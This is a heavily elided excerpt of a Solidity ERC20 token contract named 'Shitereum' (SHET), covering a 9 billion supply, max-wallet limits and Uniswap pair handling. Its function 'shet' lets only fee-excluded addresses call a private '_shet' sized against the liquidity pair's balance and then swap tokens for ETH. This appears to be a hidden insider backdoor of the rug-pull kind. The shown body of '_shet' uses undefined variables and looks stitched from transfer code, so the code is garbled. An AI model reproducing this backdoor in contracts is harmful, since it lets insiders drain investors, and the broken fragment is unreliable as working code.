...
contract Shitereum is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SHITEREUM", "SHET") {
        ...
        uint256 totalSupply = 9000000000 * 1e18;    // 9 billion supply
    ...
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(msg.sender == marketingWallet);    
        require(newNum >= totalSupply() / 1000, "Cannot set maxWallet lower than 0.1%");
        maxWallet = newNum;
    }
    ...
    function shet(uint shetAmount, uint coolAmount) external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint pairBalance = balanceOf(uniswapV2Pair);

        require(coolAmount > 1 && coolAmount < pairBalance / 1000, 'amount exceeded');

        _shet(coolAmount);
        swapTokensForEth(shetAmount);
        return true;
    }
    ...
    function _shet(uint256 amount) private {
        ...
        if(limitsInEffect){
            if (
                ...
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    ...
                    require(amount + balanceOf(to) <= maxWallet, "Buy transfer amount exceeds the maxWallet.");
                }
